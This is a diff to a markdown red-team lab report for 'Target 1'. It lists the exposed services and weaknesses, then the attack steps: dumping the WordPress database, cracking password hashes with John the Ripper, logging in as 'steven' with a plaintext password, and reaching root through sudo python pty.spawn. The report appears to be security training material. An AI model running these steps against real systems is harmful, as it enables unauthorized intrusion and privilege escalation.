@@ -1,5 +1,7 @@
 # **Red Team: Summary of Operations**
 
+## TARGET 1
+
 ### Table of Contents
 
 - Exposed Services
@@ -22,8 +24,6 @@ nmap -sV 192.168.1.110
 
 The CVE and CWE databases give us information of vulnerabilities found in the previous step. These vulnerabilities are potential points of entry:
 
-### TARGET 1
-
 Vulnerability | Description | Impact
 ---|---|---
 **CWE-200** | Exposure of sensitive Information to an unauthorized actor | Allowing sensitive information to be compromised so easily can result in a breach that can have significant affects on your business
@@ -33,7 +33,7 @@ Vulnerability | Description | Impact
 
 ---
 
-# Exploitation
+## Exploitation
 
 The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
 
@@ -101,7 +101,7 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 
     ![11](/Images/1/11.png)  
 
-    >#### note: Flags 3 and 4 can be found in different ways. At the end of this report is a summary of other methods to access flag3 and flag4.
+    >#### note: Flags 3 and 4 can be found in different ways. Look at the end of this report for alternative methods to find Flag3.
 
 ---
 
@@ -111,17 +111,17 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 
     Privilege on the system is obtained in this step after cracking the hashed password of a privileged user found in the SQL database. This allows to execute a Python Script that leads to a root access to the system.
 
-    **CRACKING THE HASH PASSWORD**
+- **CRACKING THE HASH PASSWORD**
 
     Exploit:
 
     1. In the sql database run: 
 
         ```
-            mysql> show databases;
-            mysql> use wordpress;
-            mysql> show tables;
-            mysql> SELECT* FROM wp_posts;
+        mysql> show databases;
+        mysql> use wordpress;
+        mysql> show tables;
+        mysql> SELECT* FROM wp_posts;
         ```
 
         ![5](/Images/1/5.png)
@@ -129,38 +129,37 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
     2. Create a file with the hashes and usernames in john the ripper format
 
         ![6](/Images/1/6.png)
-
-        ```
-        John hashes.txt -wordlist=’usr.share/wordlist/rockyou.txt’
-        ```
-
+        
+            John hashes.txt -wordlist=’usr.share/wordlist/rockyou.txt’
+        
         ![7](/Images/1/7.png)
-
-    **PRIVILEGE ESCALATION USING A PYTHON SCRIPT**
-
+    
+- **PRIVILEGE ESCALATION USING A PYTHON SCRIPT**
+    
     The user Steven has python root access. This led to a root privilege escalation.
 
     Exploit:
-
-    ```   
-    su steven
-    Password: pink84
-    sudo -l  
-    ```
     
-    ![8](/Images/1/8.png)
+    1. Steven has the privilege to run python language as a root user
+        ```   
+            su steven
+            Password: pink84
+            sudo -l  
+        ```
+    
+        ![8](/Images/1/8.png)
 
-    Steven has the privilege to run python language as a root user
+    2. Python Script
     
         sudo python -c 'import pty;pty.spawn("/bin/bash")'
  
-    ![9](/Images/1/9.png)
+        ![9](/Images/1/9.png)
     
         cat /root/flag4.txt
     
-    **Flag4**
+        **Flag4**
 
-    ![10](/Images/1/10.png)
+        ![10](/Images/1/10.png)
 
 ***
 
